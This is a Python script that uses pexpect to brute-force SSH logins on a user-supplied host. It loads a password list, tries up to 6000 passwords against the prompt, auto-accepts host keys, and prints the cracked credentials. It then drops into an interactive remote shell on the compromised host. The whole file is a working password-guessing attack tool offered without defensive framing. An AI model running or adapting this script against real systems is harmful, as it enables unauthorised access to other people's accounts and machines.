#!/usr/bin/env python3.6
# -*- coding: utf-8 -*-

import pexpect
from file_rw import read_data

str_con = 'Are you sure you want to continue connecting'
str_pswd = "'s [P|p]assword:"
str_try = 'Permission denied, please try again.'
str_fail = 'Permission denied'
selete=[str_try,str_fail,'#','>>>','>','\$']

def send_cmd(child,cmd):
    child.sendline(cmd)
    child.expect(selete)
    # if selete[index] == selete[-1]:
    #     print('[-]disconnect')
    print(child.before.decode('utf-8'))


def connect():
    pswdlist=read_data()
    num=0
    user=input('user: ')
    host=input('host: ')
    print('start break!')
    while num < 6000:
        # user=input('user: ')
        # host=input('host: ')
        # passwd=input('passwd: ')

        # user = 'chen'
        # host = '10.10.70.53'
        passwd = pswdlist[num]

        exec_cmd='ssh '+user+'@'+host
        child=pexpect.spawn(exec_cmd,timeout=3)   #超时3秒
        res=child.expect([pexpect.TIMEOUT,str_con,str_pswd])        #传一个字符串列表，返回对应的成员索引
        if res==0:
            print('[-]timeout')
            return
        if res==1:
            child.sendline('yes')
            res = child.expect([pexpect.TIMEOUT, str_con,str_pswd])
            if res==0:
                print('[-]timeout')
                return
        if res==2:
            while True:
                print('try %d passwd: %s' %(num, passwd),end='')
                child.sendline(passwd)
                index=child.expect(selete)
                if index ==0:
                    print('[-]try again\n--------')
                    num += 1
                    passwd = pswdlist[num]
                if index ==1:
                    print('[-]failed\n--------')
                    print(child.after.decode('utf-8'))
                    num += 1
                    # passwd = pswdlist[num]
                    break
                if 2<= index <=5:
                    print('[+]Connect Success!!!\n----------------')
                    print('ssh user: %s password: %s' % (user, passwd))
                    return child

        # if res==0:
        #     print('[-] timeout')
        #     return
        # if res==1:
        #     child.sendline('yes')
        #     res = child.expect([pexpect.TIMEOUT, str_pswd])
        # if res==0:
        #     print('[-] timeout')
        #     return
        #
        # if res==1:
        #     child.sendline(passwd)
        #     child.expect([pexpect.TIMEOUT])
        #
        # child.sendline(passwd)
        # index=child.expect(success)
        # if index==0:
        #     child.sendline(passwd)
        #
        # elif success[index] in str(success):
        #     print('[+] Connext Success!!!')
        #     print('user: %s password: %s'%(user,passwd))
        #     return child

child=connect()
if child:
    while True:
        cmd=input('input cmd:\n')
        send_cmd(child,cmd)







